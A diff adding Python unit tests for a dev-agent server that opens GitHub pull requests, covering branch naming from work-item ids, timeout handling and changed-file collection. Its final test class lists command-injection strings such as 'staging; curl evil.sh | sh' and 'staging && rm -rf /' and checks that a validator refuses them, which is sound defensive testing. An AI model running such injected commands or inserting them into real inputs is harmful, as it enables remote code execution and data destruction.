@@ -452,3 +452,228 @@ class TestHandleToolCall(unittest.TestCase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TestHeadBranchForWorkItemId(unittest.TestCase):
+    def test_work_item_id_becomes_the_branch(self):
+        self.assertEqual(srv._head_branch_for("one_bpmn", "staging", "Fix the thing.", "WI-002322"), "WI-002322")
+
+    def test_same_work_item_converges_regardless_of_description(self):
+        a = srv._head_branch_for("one_bpmn", "staging", "Fix the thing.", "WI-002322")
+        b = srv._head_branch_for("one_bpmn", "staging", "Fix the thing, reworded.", "WI-002322")
+        self.assertEqual(a, b)
+
+    def test_unsafe_characters_are_sanitised_not_rejected(self):
+        self.assertEqual(srv._head_branch_for("a", "b", "c", " WI 002322 (rev 2)~ "), "WI-002322-rev-2")
+
+    def test_blank_or_unusable_id_falls_back_to_the_hash(self):
+        hashed = srv._head_branch_for("one_bpmn", "staging", "Fix the thing.")
+        for unusable in ("", None, "~~~", " / "):
+            self.assertEqual(srv._head_branch_for("one_bpmn", "staging", "Fix the thing.", unusable), hashed)
+
+
+class TestWorkItemIdThreading(unittest.TestCase):
+    def test_tool_call_uses_the_work_item_id_for_its_branch(self):
+        payload = {
+            "action": "list_files", "target_app": "one_bpmn", "git_branch": "staging",
+            "work_item_description": "Fix the thing.", "work_item_id": "WI-002322",
+            "args": {}, "github_token": "gh-token",
+        }
+        with patch.object(srv, "_checkout_or_create_head_branch", return_value=(False, "stop here")) as checkout:
+            srv._handle_tool_call(payload)
+        checkout.assert_called_once_with("one_bpmn", "staging", "WI-002322")
+
+    def test_open_pull_request_passes_the_work_item_id_to_open_pr(self):
+        run_ctx = {
+            "git_branch": "staging", "work_item_description": "Fix it.", "work_item_id": "WI-002322",
+            "github_token": "gh-token", "correlation_id": "corr-1",
+        }
+        with patch.object(srv, "_collect_changed_files", return_value={"a.py": "x"}), patch.object(
+            srv, "_run_tests", return_value=(True, "", "")
+        ), patch.object(srv, "_open_pr", return_value=("https://github.com/x/y/pull/1", None)) as open_pr:
+            srv._tool_open_pull_request("one_bpmn", {"summary": "did it"}, run_ctx)
+        self.assertEqual(open_pr.call_args.kwargs["work_item_id"], "WI-002322")
+
+    def test_open_pr_puts_the_work_item_id_on_branch_title_and_body(self):
+        sent = []
+
+        def fake_request(method, url, token, ok=(200,), json_body=None):
+            sent.append((method, url, json_body))
+            if method == "GET" and "/git/ref/heads/" in url:
+                return {"object": {"sha": "base-sha"}}
+            if method == "POST" and url.endswith("/pulls"):
+                return {"html_url": "https://github.com/ONE-F-M/one_bpmn/pull/9", "number": 9}
+            return {}
+
+        with patch.object(srv, "_repo_for_local_clone", return_value="ONE-F-M/one_bpmn"), patch.object(
+            srv, "_github_request", side_effect=fake_request
+        ):
+            pr_url, err = srv._open_pr(
+                "one_bpmn", "staging", "Fix the thing.", {"a.py": "x"}, "gh-token", "corr-1", "changed a.py",
+                work_item_id="WI-002322",
+            )
+        self.assertIsNone(err)
+        self.assertEqual(pr_url, "https://github.com/ONE-F-M/one_bpmn/pull/9")
+        ref = next(b for m, u, b in sent if m == "POST" and u.endswith("/git/refs"))
+        self.assertEqual(ref["ref"], "refs/heads/WI-002322")
+        pr = next(b for m, u, b in sent if m == "POST" and u.endswith("/pulls"))
+        self.assertEqual(pr["head"], "WI-002322")
+        self.assertTrue(pr["title"].startswith("WI-002322: "))
+        self.assertIn("Work Item: **WI-002322**", pr["body"])
+
+    def test_without_a_work_item_id_nothing_changes(self):
+        """The hashed branch and the old title survive for callers that send no id."""
+        sent = []
+
+        def fake_request(method, url, token, ok=(200,), json_body=None):
+            sent.append((method, url, json_body))
+            if method == "GET" and "/git/ref/heads/" in url:
+                return {"object": {"sha": "base-sha"}}
+            if method == "POST" and url.endswith("/pulls"):
+                return {"html_url": "https://github.com/ONE-F-M/one_bpmn/pull/9", "number": 9}
+            return {}
+
+        with patch.object(srv, "_repo_for_local_clone", return_value="ONE-F-M/one_bpmn"), patch.object(
+            srv, "_github_request", side_effect=fake_request
+        ):
+            srv._open_pr("one_bpmn", "staging", "Fix the thing.", {"a.py": "x"}, "gh-token", "corr-1", "r")
+        pr = next(b for m, u, b in sent if m == "POST" and u.endswith("/pulls"))
+        self.assertEqual(pr["head"], srv._head_branch_for("one_bpmn", "staging", "Fix the thing."))
+        self.assertTrue(pr["title"].startswith("Dev Agent: "))
+        self.assertNotIn("Work Item:", pr["body"])
+
+class TestHungCommandsReadAsFailures(unittest.TestCase):
+    def test_run_turns_a_timeout_into_a_failed_result(self):
+        boom = srv.subprocess.TimeoutExpired(cmd="yarn build", timeout=900, output=b"partial out", stderr=b"")
+        with patch.object(srv.subprocess, "run", side_effect=boom):
+            result = srv._run("cd /x && yarn build", timeout=900)
+        self.assertEqual(result.returncode, 124)
+        self.assertIn("partial out", result.stdout)
+        self.assertIn("timed out after 900s", result.stderr)
+        self.assertIn("yarn build", result.stderr)
+
+    def test_mobile_tests_report_a_hung_build_instead_of_raising(self):
+        hung = srv.subprocess.CompletedProcess("yarn build", 124, "", "timed out after 900s: yarn build")
+        with patch.object(srv, "_run", return_value=hung) as run:
+            passed, stdout, stderr = srv._run_tests("mobile_app_ionic")
+        self.assertFalse(passed)
+        self.assertIn("timed out after 900s", stderr)
+        run.assert_called_once()  # a hung build never reaches the unit tests
+
+    def test_an_escaping_exception_still_marks_the_job_failed_and_calls_back(self):
+        payload = {"correlation_id": "corr-9", "callback_url": "https://processa.example.com/cb"}
+
+        def job(_payload):
+            raise RuntimeError("something nobody anticipated")
+
+        with patch.object(srv, "_set_status") as set_status, patch.object(srv, "_post_callback") as post:
+            srv._report_unexpected_failure(job, payload)
+        set_status.assert_called_once()
+        self.assertEqual(set_status.call_args.kwargs["state"], "failed")
+        self.assertIn("RuntimeError", set_status.call_args.kwargs["error"])
+        post.assert_called_once()
+        url, body = post.call_args.args
+        self.assertEqual(url, "https://processa.example.com/cb")
+        self.assertEqual(body["correlation_id"], "corr-9")
+        self.assertEqual(body["status"], "failed")
+        self.assertIn("something nobody anticipated", body["error"])
+
+    def test_a_job_that_finishes_normally_reports_nothing_extra(self):
+        with patch.object(srv, "_set_status") as set_status, patch.object(srv, "_post_callback") as post:
+            srv._report_unexpected_failure(lambda p: None, {"correlation_id": "corr-9"})
+        set_status.assert_not_called()
+        post.assert_not_called()
+
+class TestCollectChangedFilesSeesCommittedEdits(unittest.TestCase):
+    """The fast tools commit every edit as it happens, so by the time
+    open_pull_request looks, `git diff HEAD` is empty — the change lives in
+    the branch's own commits."""
+
+    def setUp(self):
+        self.bench_dir = os.path.realpath(tempfile.mkdtemp())
+        self.app_dir = os.path.join(self.bench_dir, "apps", "one_bpmn")
+        os.makedirs(os.path.join(self.app_dir, "spiff"))
+        for name in ("committed.vue", "pending.py", "both.js"):
+            with open(os.path.join(self.app_dir, "spiff", name), "w") as fh:
+                fh.write(f"content of {name}")
+        self.bench_dir_patch = patch.object(srv, "BENCH_DIR", self.bench_dir)
+        self.bench_dir_patch.start()
+
+    def tearDown(self):
+        self.bench_dir_patch.stop()
+        shutil.rmtree(self.bench_dir, ignore_errors=True)
+
+    @staticmethod
+    def _fake_run(cmd, **kwargs):
+        if "git diff --name-only staging...HEAD" in cmd:
+            return _FakeCompletedProcess(0, "spiff/committed.vue\nspiff/both.js\n", "")
+        if "git diff --name-only HEAD" in cmd:
+            return _FakeCompletedProcess(0, "spiff/pending.py\nspiff/both.js\n", "")
+        raise AssertionError(cmd)
+
+    def test_committed_and_pending_changes_are_both_collected_once(self):
+        with patch.object(srv, "_run", side_effect=self._fake_run):
+            files = srv._collect_changed_files("one_bpmn", "staging")
+        self.assertEqual(sorted(files), ["spiff/both.js", "spiff/committed.vue", "spiff/pending.py"])
+        self.assertEqual(files["spiff/committed.vue"], "content of committed.vue")
+
+    def test_without_a_base_branch_only_pending_changes_are_collected(self):
+        with patch.object(srv, "_run", side_effect=self._fake_run):
+            files = srv._collect_changed_files("one_bpmn")
+        self.assertEqual(sorted(files), ["spiff/both.js", "spiff/pending.py"])
+
+    def test_open_pull_request_diffs_against_the_run_base_branch(self):
+        run_ctx = {"git_branch": "staging", "work_item_description": "Fix it.",
+                   "github_token": "gh-token", "correlation_id": "corr-1"}
+        with patch.object(srv, "_collect_changed_files", return_value={}) as collect, patch.object(
+            srv, "_run_tests"
+        ), patch.object(srv, "_open_pr"):
+            srv._tool_open_pull_request("one_bpmn", {"summary": "s"}, run_ctx)
+        collect.assert_called_once_with("one_bpmn", "staging")
+
+
+class TestShellIdentifiersAreValidated(unittest.TestCase):
+    """target_app and git_branch reach `subprocess.run(..., shell=True)`, so a
+    value carrying shell metacharacters must be refused before anything runs."""
+
+    def _tool_call(self, **over):
+        payload = {"action": "list_files", "target_app": "one_bpmn", "git_branch": "staging",
+                   "work_item_description": "Fix it.", "github_token": "gh-token"}
+        payload.update(over)
+        return payload
+
+    def test_a_clean_payload_still_passes(self):
+        self.assertIsNone(srv._validate_tool_call_payload(self._tool_call()))
+        self.assertIsNone(srv._validate_payload(_valid_payload()))
+
+    def test_command_injection_in_git_branch_is_refused(self):
+        for evil in ("staging; curl evil.sh | sh", "staging && rm -rf /", "staging`id`",
+                     "staging$(id)", "staging | tee /tmp/x", "-staging", "a..b", "staging/"):
+            error = srv._validate_tool_call_payload(self._tool_call(git_branch=evil))
+            self.assertIsNotNone(error, f"accepted {evil!r}")
+            self.assertIn("git_branch", error)
+
+    def test_command_injection_in_target_app_is_refused(self):
+        for evil in ("one_bpmn; id", "../../etc", "one bpmn", "one_bpmn$(id)", ""):
+            error = srv._validate_tool_call_payload(self._tool_call(target_app=evil))
+            self.assertIsNotNone(error, f"accepted {evil!r}")
+
+    def test_the_run_endpoint_is_guarded_too(self):
+        error = srv._validate_payload(_valid_payload(git_branch="staging; id"))
+        self.assertIn("git_branch", error)
+        error = srv._validate_payload({**_valid_payload(), "action": "run_tests",
+                                       "target_app": "one_bpmn; id"})
+        self.assertIn("target_app", error)
+
+    def test_real_branch_shapes_are_still_accepted(self):
+        for good in ("staging", "version-15", "WI-002322", "feature/thing_1.2", "dev-agent/7ecdc32674ea3c20"):
+            self.assertIsNone(srv._validate_tool_call_payload(self._tool_call(git_branch=good)), good)
+
+    def test_every_shell_interpolation_is_quoted(self):
+        """Defence in depth behind the validator: no _run() f-string may drop a
+        bare {value} into the command line."""
+        import inspect, re as _re
+        source = inspect.getsource(srv)
+        bare = [l.strip() for l in source.splitlines()
+                if "_run(f" in l and _re.search(r"\{(?!shlex\.quote)[a-z_]+\}", l)]
+        self.assertEqual(bare, [])
